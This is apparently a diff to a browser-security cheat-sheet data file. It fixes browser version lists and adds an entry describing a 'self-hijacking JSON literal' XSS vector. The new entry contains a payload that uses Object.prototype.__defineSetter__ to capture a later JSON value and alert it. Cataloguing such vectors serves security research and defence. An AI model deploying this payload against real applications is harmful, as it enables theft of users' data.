@@ -343,10 +343,10 @@ var items =
                 '10.0', '10.5'
             ],
             'chrome': [
-                '4.0', '5.5'
+                '4.0', '5.0'
             ],
             'firefox': [
-                '3.0', '3.5', '3.7', '3.7'
+                '3.0', '3.5', '3.6', '3.7'
             ]            
         },
         'tags'       : ['xss', 'svg', 'onload', 'opera', 'firefox', 'chrome'],
@@ -1471,10 +1471,10 @@ var items =
                 '10.0', '10.5'
             ],
             'chrome': [
-                '4.0', '5.5'
+                '4.0', '5.0'
             ],
             'firefox': [
-                '3.0', '3.5', '3.7', '3.7'
+                '3.0', '3.5', '3.6', '3.7'
             ],
             'internet explorer': ['9.0']
         },
@@ -1675,6 +1675,43 @@ var items =
             'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'behavior', 'internet explorer', 'style', 'css', 'data island'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 54 - Self-hijacking JSON literals */
+        'id'         : 54,
+        'category'   : 'json', 
+        'name'       : {
+            'en' : 'Self-hijacking JSON literals',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]',
+        'description': {
+            'en' : 'In case parts of a JSON literal are controlled by user input there\'s a risk to allow auto-harvesting values from later object members.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera': [
+                '10.0', 'mobile'
+            ],
+            'chrome': [
+                '4.0', '5.0'
+            ],
+            'firefox': [
+                '1.x', '2.x', '3.0'
+            ],
+        },
+        'tags'       : ['xss', 'javascript', 'json', '__definesetter__', 'object', 'prototype'],
         'reporter'   : '.mario'
     }
 ]
